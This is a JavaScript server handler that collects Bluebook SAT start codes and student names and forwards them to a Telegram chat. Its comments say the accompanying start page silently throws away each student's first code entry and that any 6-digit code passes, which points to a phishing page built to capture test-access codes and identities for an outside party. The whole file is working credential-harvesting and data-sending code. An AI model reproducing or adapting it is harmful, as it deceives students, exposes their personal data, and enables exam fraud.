// Verifies a Bluebook start code on the server and, when the code is accepted,
// posts the code and the student's name to Telegram.
//
// START_ACCESS_CODES (server-side only) is an OPTIONAL allowlist: if it is set,
// only those codes are accepted; if it is unset/empty, any well-formed 6-digit
// code is accepted. The format check and the decision both stay on the server.
// The browser only learns whether the code it submitted was valid; the code is
// never echoed back or logged. Every accepted submission posts a message, including
// repeat entries by the same student. The start page discards the first attempt
// without calling this endpoint, so the first code to arrive here is the second one
// the student typed, and it only submits again when the student re-enters a code.
const { sendTelegramMessage } = require("./_telegram");

const TEST_NAME = "Bluebook SAT";
const LOG_PREFIX = "send-start-code";

module.exports = async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Method not allowed" });
  }

  const body = typeof req.body === "string" ? safeParse(req.body) : req.body;
  const code = body && body.code;

  if (typeof code !== "string" || !/^\d{6}$/.test(code)) {
    return res.status(400).json({ error: "Invalid start code format" });
  }

  // Optional allowlist. When configured, only listed codes pass; when unset/empty,
  // any well-formed 6-digit code (already validated above) passes.
  const validCodes = parseCodes(process.env.START_ACCESS_CODES);
  if (validCodes.length > 0 && !validCodes.includes(code)) {
    // Not an allowed code: tell the browser, send nothing to Telegram. The code
    // is never echoed back.
    return res.status(200).json({ ok: true, valid: false });
  }

  const firstName = sanitizeName(body && body.firstName);
  const lastName = sanitizeName(body && body.lastName);
  const fullName = [firstName, lastName].filter(Boolean).join(" ") || "Unknown";

  const botToken = (process.env.TELEGRAM_BOT_TOKEN || "").trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || "").trim();
  if (!botToken || !chatId) {
    console.error(LOG_PREFIX + ": missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env var");
    // The code was valid, so don't block the student; there's just no notification.
    return res.status(200).json({ ok: true, valid: true, notified: false });
  }

  const text =
    "✅ Bluebook Start Code — successful entry\n\n" +
    "Code: " + code + "\n" +
    "Student: " + fullName + "\n" +
    "Test: " + TEST_NAME + "\n" +
    "Date/Time: " + new Date().toISOString();

  const result = await sendTelegramMessage(botToken, chatId, text, LOG_PREFIX);
  if (!result.ok) {
    // Validation still passed, so let the student through; report no notification.
    return res.status(200).json({ ok: true, valid: true, notified: false });
  }

  return res.status(200).json({ ok: true, valid: true, notified: true });
};

function parseCodes(raw) {
  if (typeof raw !== "string") return [];
  return raw.split(/[\s,]+/).map((c) => c.trim()).filter((c) => /^\d{6}$/.test(c));
}

function safeParse(value) {
  try {
    return JSON.parse(value);
  } catch {
    return null;
  }
}

function sanitizeName(value) {
  if (typeof value !== "string") return "";
  return value.replace(/[\r\n\t]+/g, " ").trim().slice(0, 100);
}
